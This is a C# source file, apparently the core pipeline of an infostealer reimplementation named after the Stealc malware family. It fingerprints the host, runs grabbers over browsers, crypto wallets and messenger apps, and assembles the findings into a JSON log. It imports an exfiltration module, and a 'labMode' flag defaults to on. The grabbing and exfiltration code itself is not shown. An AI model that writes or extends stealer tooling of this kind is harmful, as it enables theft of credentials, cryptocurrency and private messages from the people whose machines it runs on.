using Stealc.Grabber.Grabbers;
using Stealc.Grabber.Exfil;

namespace Stealc.Grabber.Core;

public sealed class Pipeline
{
    private readonly bool _labMode;

    public Pipeline(bool labMode = true) => _labMode = labMode;

    public PipelineResult Run()
    {
        var sysInfo = new SystemInfo();
        var fingerprint = new Fingerprint();

        var browsers = new BrowserGrabber(_labMode).Scan();
        var wallets = new WalletGrabber(_labMode).Scan();
        var messengers = new MessengerGrabber(_labMode).Scan();

        var log = new LogBuilder(sysInfo, browsers, wallets, messengers);
        var json = log.BuildJson();

        return new PipelineResult
        {
            Fingerprint = fingerprint.ShortId,
            BrowsersScanned = browsers.Count,
            WalletsScanned = wallets.Count,
            MessengersScanned = messengers.Count,
            TotalFound = log.TotalFindings,
            LogJson = json
        };
    }
}

public sealed class PipelineResult
{
    public required string Fingerprint { get; init; }
    public int BrowsersScanned { get; init; }
    public int WalletsScanned { get; init; }
    public int MessengersScanned { get; init; }
    public int TotalFound { get; init; }
    public required string LogJson { get; init; }
}
